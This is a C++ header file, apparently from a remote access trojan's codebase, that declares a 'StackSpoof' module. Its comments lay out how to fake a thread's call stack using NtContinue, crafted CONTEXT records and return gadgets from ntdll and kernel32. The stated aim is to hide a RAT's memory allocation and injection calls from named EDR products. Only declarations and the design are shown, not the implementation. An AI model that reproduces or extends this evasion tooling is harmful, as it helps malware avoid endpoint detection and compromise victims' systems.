#pragma once
#ifndef STACKSPOOF_H
#define STACKSPOOF_H
#include "common.h"

// StackSpoof — fake the call stack of the current thread using NtContinue.
//
// WHY call stacks matter for detection:
//   Advanced EDRs (CrowdStrike, SentinelOne, Microsoft MDE) walk the call stack
//   of threads that perform sensitive operations (VirtualAlloc, CreateRemoteThread,
//   WriteProcessMemory, etc.). A legitimate app's call stack looks like:
//     ntdll!NtAllocateVirtualMemory
//     kernel32!VirtualAllocEx
//     somemodule.dll+0x1234
//     ... (legitimate module frames)
//   A RAT's call stack looks like:
//     ntdll!NtAllocateVirtualMemory
//     [unbacked RWX allocation]+0x56   ← RED FLAG: RWX region, not a known module
//
// This module provides a spoofed-call wrapper:
//   1. Build a fake CONTEXT with RSP pointing to a crafted stack frame chain
//      made up of return addresses from known legitimate modules (e.g. kernel32, ntdll)
//   2. Use NtContinue to execute a callback function under that fake stack
//   3. The callback (e.g. VirtualAllocEx) is invoked with EDR-visible stack frames
//      all pointing into legitimate DLLs
//
// Implementation uses the Unwinder technique: craft a CONTEXT with:
//   - Fake return addresses built from real RET gadgets in ntdll/kernel32
//   - RSP pointing to our crafted fake frame chain
//   - RIP pointing to the real function we want to call
//
// MITRE T1134, T1055 (call-stack evasion is an auxiliary to injection)

namespace StackSpoof {
    // Typedef for the function to call under a spoofed stack.
    typedef ULONG_PTR(*SpoofedFn)(ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR);

    // Call `fn(a1,a2,a3,a4)` with a fake call stack made of legitimate return
    // addresses from kernel32 + ntdll. Returns fn's return value.
    // The stack seen by EDR walk shows: kernel32 → ntdll → fn, not our code.
    ULONG_PTR Call(SpoofedFn fn,
                   ULONG_PTR a1=0, ULONG_PTR a2=0,
                   ULONG_PTR a3=0, ULONG_PTR a4=0);

    // Report the actual vs spoofed call stack for validation.
    std::string StackReport();
}

#endif
